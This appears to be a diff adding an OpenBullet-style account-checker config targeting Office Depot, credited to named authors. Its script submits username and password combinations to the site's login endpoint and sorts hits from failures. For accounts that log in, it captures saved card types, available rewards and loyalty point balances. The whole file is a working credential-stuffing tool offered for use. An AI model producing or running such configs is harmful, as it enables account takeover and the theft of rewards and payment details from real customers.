@@ -1,0 +1,111 @@
+[SETTINGS]
+{
+  "Name": "Office Depot",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-07-07T03:02:34.9842752-04:00",
+  "AdditionalInfo": "",
+  "Author": "Shofur & QT White2001",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.officedepot.com/mobile/getAjaxPriceListFromService.do?items=196517,870284,9923336,9785293,348037,431632,898782,7436830,744074,9667415,358955,8673772,818654,434207,6218671" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST POST "https://www.officedepot.com/json/loginAccount.do;jsessionid=<COOKIE(JSESSIONID)>" 
+  CONTENT "{\"loginName\":\"<USER>\",\"password\":\"<PASS>\",\"autoLogin\":false}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+  KEYCHAIN Failure OR 
+    KEY "Your login name or Password is incorrect" 
+
+REQUEST GET "https://www.officedepot.com/mobile/tenderList.do" 
+  
+  HEADER "accept: application/vnd.3210c3cdm9+json; version=2.0" 
+  HEADER "connection: keep-alive" 
+  HEADER "accept-language: en;q=1" 
+  HEADER "accept-encoding: application/json" 
+  HEADER "pragma: no-cache" 
+  HEADER "host: www.officedepot.com" 
+  HEADER "user-agent: Mozilla/5.0 (Linux; Android 5.1.1; SM-G930L Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "referrer: https://www.officedepot.com/?isMobileApp=true" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 33" 
+
+PARSE "<SOURCE>" JSON "cardType" Recursive=TRUE CreateEmpty=FALSE -> CAP "cc" 
+
+REQUEST GET "https://www.officedepot.com/mobile/loyalty/getRewards.do" 
+  
+  HEADER "Host: www.officedepot.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36" 
+  HEADER "Accept: */*" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.officedepot.com/account/accountSummaryDisplay.do" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+PARSE "<SOURCE>" JSON "totalAvailableRewards" CreateEmpty=FALSE -> CAP "Rewards" 
+
+PARSE "<SOURCE>" JSON "loyaltyPoints" CreateEmpty=FALSE -> CAP "Balance" 
+
+!KEYCHECK BanOnToCheck=FALSE 
+!  KEYCHAIN Custom "CUSTOM" OR 
+!    KEY "<Balance>" Contains "0" 
+!  KEYCHAIN Success OR 
+!    KEY "<SOURCE>" DoesNotContain "0" 
+
+PARSE "<SOURCE>" JSON "loyaltyRewards" Recursive=TRUE CreateEmpty=FALSE -> CAP "Rewards" 
+
